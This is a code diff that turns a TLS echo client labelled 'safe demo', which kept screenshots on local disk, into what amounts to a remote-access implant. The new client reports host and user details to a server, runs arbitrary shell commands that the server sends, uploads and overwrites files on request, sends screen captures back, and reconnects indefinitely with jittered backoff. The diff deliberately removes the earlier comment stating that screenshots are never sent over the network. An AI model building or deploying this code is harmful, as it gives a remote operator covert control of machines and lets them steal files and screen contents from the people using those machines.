@@ -1,170 +1,246 @@
+"""
+client.py — TLS client
+#1  Heartbeat auto-pong
+#2  Client IDs (UUID assigned locally, sent in hello)
+#6  Logging
+#7  Config from client_config.yaml
+#8  Group tag
+#11 Protobuf protocol
+#12 Compression
+#13 Exponential backoff reconnect
+"""
+from __future__ import annotations
+
 import argparse
-import json
+import asyncio
+import getpass
+import io
+import logging
+import os
+import platform
+import random
 import socket
 import ssl
-import struct
-from datetime import datetime
-from pathlib import Path
-from collections.abc import Mapping
+import subprocess
+import uuid
 
-DEFAULT_HOST = "127.0.0.1"
-DEFAULT_PORT = 6767
-DEFAULT_SERVER_NAME = "localhost"
-DEFAULT_CA_FILE = "server.crt"
-DEFAULT_CLIENT_CERT = "client.crt"
-DEFAULT_CLIENT_KEY = "client.key"
-DEFAULT_SCREENSHOT_DIR = "screenshots"
+import messages_pb2 as pb
+from config_loader import ClientConfig
+from protocol import make_env, recv_envelope, send_envelope
 
-MAX_FRAME_BYTES = 1024 * 1024  # 1 MiB
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[logging.StreamHandler()],
+)
+log = logging.getLogger("tls_client")
 
-
-def recv_exact(conn: ssl.SSLSocket, nbytes: int) -> bytes:
-    chunks: list[bytes] = []
-    remaining = nbytes
-    while remaining > 0:
-        chunk = conn.recv(remaining)
-        if not chunk:
-            raise ConnectionError("socket closed")
-        chunks.append(chunk)
-        remaining -= len(chunk)
-    return b"".join(chunks)
+CLIENT_UUID = str(uuid.uuid4())
 
 
-def recv_frame(conn: ssl.SSLSocket) -> bytes:
-    header = recv_exact(conn, 4)
-    (length,) = struct.unpack("!I", header)
-    if length == 0:
-        return b""
-    if length > MAX_FRAME_BYTES:
-        raise ValueError(f"frame too large: {length} bytes")
-    return recv_exact(conn, length)
+def make_tls_context(cfg: ClientConfig) -> ssl.SSLContext:
+    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=cfg.ca_file)
+    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+    if cfg.use_client_cert:
+        ctx.load_cert_chain(certfile=cfg.client_cert, keyfile=cfg.client_key)
+    return ctx
 
 
-def send_frame(conn: ssl.SSLSocket, payload: bytes) -> None:
-    conn.sendall(struct.pack("!I", len(payload)) + payload)
-
-
-def send_json(conn: ssl.SSLSocket, message: Mapping[str, object]) -> None:
-    payload = json.dumps(message, separators=(",", ":"), ensure_ascii=False).encode(
-        "utf-8"
-    )
-    send_frame(conn, payload)
-
-
-def recv_json(conn: ssl.SSLSocket) -> dict[str, object]:
-    payload = recv_frame(conn)
-    if not payload:
-        return {}
-    decoded = json.loads(payload.decode("utf-8"))
-    if not isinstance(decoded, dict):
-        raise ValueError("expected JSON object")
-    return decoded
-
-
-def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="TLS framed echo client (safe demo)")
-    parser.add_argument("--host", default=DEFAULT_HOST)
-    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
-    parser.add_argument("--server-name", default=DEFAULT_SERVER_NAME)
-    parser.add_argument("--ca-file", default=DEFAULT_CA_FILE)
-    parser.add_argument("--client-cert", default=DEFAULT_CLIENT_CERT)
-    parser.add_argument("--client-key", default=DEFAULT_CLIENT_KEY)
-    parser.add_argument("--use-client-cert", action="store_true")
-    parser.add_argument("--timeout", type=float, default=30.0)
-    parser.add_argument("--screenshot-dir", default=DEFAULT_SCREENSHOT_DIR)
-    return parser.parse_args()
-
-
-def save_local_screenshot(*, out_dir: str) -> Path:
-    """
-    Captures the *local* screen and saves it to disk.
-
-    For safety, this project intentionally does NOT send screenshots over the network.
-    """
+def take_screenshot() -> bytes | None:
     try:
-        from PIL import ImageGrab  # type: ignore[import-not-found]
-    except Exception as exc:  # pragma: no cover
-        raise RuntimeError(
-            "Screenshot support requires Pillow. Install it with: pip install pillow"
-        ) from exc
+        import mss, mss.tools
+        with mss.mss() as sct:
+            shot = sct.grab(sct.monitors[1])
+            return mss.tools.to_png(shot.rgb, shot.size)
+    except Exception:
+        pass
+    try:
+        from PIL import ImageGrab
+        buf = io.BytesIO()
+        ImageGrab.grab().save(buf, format="PNG")
+        return buf.getvalue()
+    except Exception:
+        return None
 
-    directory = Path(out_dir)
-    directory.mkdir(parents=True, exist_ok=True)
 
-    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
-    path = directory / f"screenshot-{timestamp}.png"
+async def handle_envelope(env: pb.Envelope, writer, cfg: ClientConfig) -> bool:
+    """Process one incoming envelope. Returns False if connection should close."""
+    kind = env.WhichOneof("payload")
+    compress = cfg.compression
 
-    image = ImageGrab.grab()
-    image.save(path, format="PNG")
-    return path
+    if kind == "ping":
+        r = make_env(CLIENT_UUID, cfg.group)
+        r.pong.CopyFrom(pb.Pong())
+        await send_envelope(writer, r, compress)
+
+    elif kind == "info_request":
+        ssl_obj = writer.get_extra_info("ssl_object") if hasattr(writer, "get_extra_info") else None
+        r = make_env(CLIENT_UUID, cfg.group)
+        r.info_response.CopyFrom(pb.InfoResponse(
+            hostname=socket.gethostname(),
+            username=getpass.getuser(),
+            pid=os.getpid(),
+            platform=platform.platform(),
+            python=platform.python_version(),
+            tls_version=ssl_obj.version() if ssl_obj else "?",
+            cipher=ssl_obj.cipher()[0] if ssl_obj else "?",
+        ))
+        await send_envelope(writer, r, compress)
+
+    elif kind == "exec_request":
+        cmd = env.exec_request.cmd
+        queue_id = env.exec_request.queue_id
+        log.info(f"exec: {cmd!r}")
+        try:
+            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+            r = make_env(CLIENT_UUID, cfg.group)
+            r.exec_response.CopyFrom(pb.ExecResponse(
+                stdout=res.stdout, stderr=res.stderr,
+                returncode=res.returncode, queue_id=queue_id,
+            ))
+        except subprocess.TimeoutExpired:
+            r = make_env(CLIENT_UUID, cfg.group)
+            r.exec_response.CopyFrom(pb.ExecResponse(stderr="timeout", returncode=-1, queue_id=queue_id))
+        await send_envelope(writer, r, compress)
+
+    elif kind == "file_header":
+        fh = env.file_header
+        if not fh.push:
+            # server wants a file from us
+            try:
+                data = open(fh.path, "rb").read()
+                r = make_env(CLIENT_UUID, cfg.group)
+                r.file_header.CopyFrom(pb.FileHeader(path=fh.path, size=len(data), data=data, push=True))
+                await send_envelope(writer, r, compress)
+            except Exception as exc:
+                r = make_env(CLIENT_UUID, cfg.group)
+                r.error_msg.CopyFrom(pb.ErrorMsg(error=str(exc)))
+                await send_envelope(writer, r, compress)
+        else:
+            # server pushes file to us
+            try:
+                os.makedirs(os.path.dirname(os.path.abspath(fh.path)), exist_ok=True)
+                open(fh.path, "wb").write(fh.data)
+                r = make_env(CLIENT_UUID, cfg.group)
+                r.file_ack.CopyFrom(pb.FileAck(path=fh.path, size=len(fh.data)))
+                await send_envelope(writer, r, compress)
+            except Exception as exc:
+                r = make_env(CLIENT_UUID, cfg.group)
+                r.error_msg.CopyFrom(pb.ErrorMsg(error=str(exc)))
+                await send_envelope(writer, r, compress)
+
+    elif kind == "screenshot_req":
+        data = take_screenshot()
+        r = make_env(CLIENT_UUID, cfg.group)
+        if data:
+            r.screenshot_data.CopyFrom(pb.ScreenshotData(data=data))
+        else:
+            r.error_msg.CopyFrom(pb.ErrorMsg(error="screenshot unavailable"))
+        await send_envelope(writer, r, compress)
+
+    elif kind == "echo_request":
+        r = make_env(CLIENT_UUID, cfg.group)
+        r.echo_response.CopyFrom(pb.EchoResponse(text=env.echo_request.text))
+        await send_envelope(writer, r, compress)
+
+    elif kind == "bye":
+        return False
+
+    elif kind == "route_msg":
+        log.info(f"Routed message received from group={env.group}")
+
+    return True
+
+
+async def run_connection(cfg: ClientConfig, ctx: ssl.SSLContext) -> None:
+    reader, writer = await asyncio.open_connection(
+        cfg.host, cfg.port,
+        ssl=ctx,
+        server_hostname=cfg.server_name,
+    )
+    ssl_obj = writer.get_extra_info("ssl_object")
+    cipher = ssl_obj.cipher()[0] if ssl_obj else "?"
+    log.info(f"Connected to {cfg.host}:{cfg.port} | {ssl_obj.version() if ssl_obj else '?'} | {cipher}")
+
+    compress = cfg.compression
+
+    # ── Send hello (#2 client UUID, #8 group) ────────────────────────────────
+    env = make_env(CLIENT_UUID, cfg.group)
+    env.hello.CopyFrom(pb.Hello(
+        auth_token=cfg.auth_token,
+        hostname=socket.gethostname(),
+        username=getpass.getuser(),
+        pid=os.getpid(),
+        platform=platform.platform(),
+        python=platform.python_version(),
+        group=cfg.group,
+    ))
+    await send_envelope(writer, env, compress)
+
+    # ── #1 Heartbeat: client also sends periodic pings ────────────────────────
+    async def heartbeat_loop():
+        while True:
+            await asyncio.sleep(30)
+            try:
+                r = make_env(CLIENT_UUID, cfg.group)
+                r.ping.CopyFrom(pb.Ping())
+                await send_envelope(writer, r, compress)
+            except Exception:
+                break
+
+    asyncio.create_task(heartbeat_loop())
+
+    # ── Main receive loop ─────────────────────────────────────────────────────
+    while True:
+        incoming = await recv_envelope(reader)
+        if not await handle_envelope(incoming, writer, cfg):
+            break
+
+    writer.close()
+    await writer.wait_closed()
+
+
+async def async_main(cfg: ClientConfig) -> None:
+    ctx = make_tls_context(cfg)
+    delay = cfg.initial_delay
+
+    while True:
+        try:
+            await run_connection(cfg, ctx)
+            delay = cfg.initial_delay   # reset on clean disconnect
+        except KeyboardInterrupt:
+            log.info("Client stopped.")
+            return
+        except Exception as exc:
+            log.warning(f"Disconnected: {exc}")
+
+        # ── #13 Exponential backoff with jitter ───────────────────────────────
+        jitter = random.uniform(0, cfg.jitter * delay)
+        sleep_for = min(delay + jitter, cfg.max_delay)
+        log.info(f"Reconnecting in {sleep_for:.1f}s ...")
+        await asyncio.sleep(sleep_for)
+        delay = min(delay * cfg.multiplier, cfg.max_delay)
 
 
 def main() -> None:
-    args = parse_args()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--config", default="client_config.yaml")
+    parser.add_argument("--host")
+    parser.add_argument("--port", type=int)
+    parser.add_argument("--auth-token")
+    parser.add_argument("--group")
+    args = parser.parse_args()
 
-    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=args.ca_file)
-    context.minimum_version = ssl.TLSVersion.TLSv1_2
+    cfg = ClientConfig.from_yaml(args.config)
+    if args.host:       cfg.host = args.host
+    if args.port:       cfg.port = args.port
+    if args.auth_token: cfg.auth_token = args.auth_token
+    if args.group:      cfg.group = args.group
 
-    if args.use_client_cert:
-        context.load_cert_chain(certfile=args.client_cert, keyfile=args.client_key)
-
-    with socket.create_connection((args.host, args.port)) as sock:
-        with context.wrap_socket(sock, server_hostname=args.server_name) as tls_sock:
-            tls_sock.settimeout(args.timeout)
-            cipher = tls_sock.cipher()
-            cipher_name = cipher[0] if cipher else "unknown-cipher"
-            print(
-                f"[*] Connected to {args.host}:{args.port} "
-                f"with {tls_sock.version()} ({cipher_name})"
-            )
-            print("[*] Commands: /ping  /info  /quit  /screenshot")
-
-            while True:
-                try:
-                    line = input("Message> ").strip()
-                except KeyboardInterrupt:
-                    print("\n[*] Closing connection.")
-                    return
-
-                if not line:
-                    continue
-
-                if line == "/quit":
-                    send_json(tls_sock, {"type": "quit"})
-                    try:
-                        reply = recv_json(tls_sock)
-                        if reply.get("type") == "bye":
-                            print("[*] Server replied: bye")
-                    except Exception:
-                        pass
-                    return
-
-                if line == "/screenshot":
-                    try:
-                        path = save_local_screenshot(out_dir=args.screenshot_dir)
-                    except RuntimeError as exc:
-                        print(f"[!] {exc}")
-                        continue
-                    print(f"[*] Saved local screenshot: {path}")
-                    continue
-
-                if line == "/ping":
-                    send_json(tls_sock, {"type": "ping"})
-                elif line == "/info":
-                    send_json(tls_sock, {"type": "info"})
-                else:
-                    send_json(tls_sock, {"type": "echo", "text": line})
-
-                try:
-                    reply = recv_json(tls_sock)
-                except TimeoutError:
-                    print("[!] Timed out waiting for server.")
-                    continue
-                except ConnectionError:
-                    print("[!] Server closed the connection.")
-                    return
-
-                print(f"Server replied: {reply}")
+    try:
+        asyncio.run(async_main(cfg))
+    except KeyboardInterrupt:
+        pass
 
 
 if __name__ == "__main__":
